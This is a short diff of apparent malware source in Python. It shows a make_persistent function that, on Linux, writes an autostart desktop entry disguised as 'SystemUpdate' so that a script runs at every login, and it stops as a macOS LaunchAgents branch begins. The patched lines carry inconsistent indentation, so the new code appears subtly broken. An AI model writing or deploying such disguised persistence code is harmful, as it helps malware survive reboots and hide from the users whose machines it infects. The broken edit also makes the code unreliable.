@@ -262,17 +262,16 @@ def make_persistent():
         autostart_dir = os.path.expanduser("~/.config/autostart")
         os.makedirs(autostart_dir, exist_ok=True)
         shortcut = os.path.join(autostart_dir, "SystemUpdate.desktop")
-        with open(shortcut, "w") as f:
-            f.write(f"""
-[Desktop Entry]
-Type=Application
-Exec=python3 {script_path}
-Hidden=false
-NoDisplay=false
-X-GNOME-Autostart-enabled=true
-Name=SystemUpdate
-Comment=Auto-start script
-"""")
+                with open(shortcut, "w") as f:
+                    f.write(f"""[Desktop Entry]
+        Type=Application
+        Exec=python3 {script_path}
+        Hidden=false
+        NoDisplay=false
+        X-GNOME-Autostart-enabled=true
+        Name=SystemUpdate
+        Comment=Auto-start script
+        """)
         debug("Persistence set up successfully on Linux.")
     elif system == "Darwin":  # macOS
         launch_agents = os.path.expanduser("~/Library/LaunchAgents")
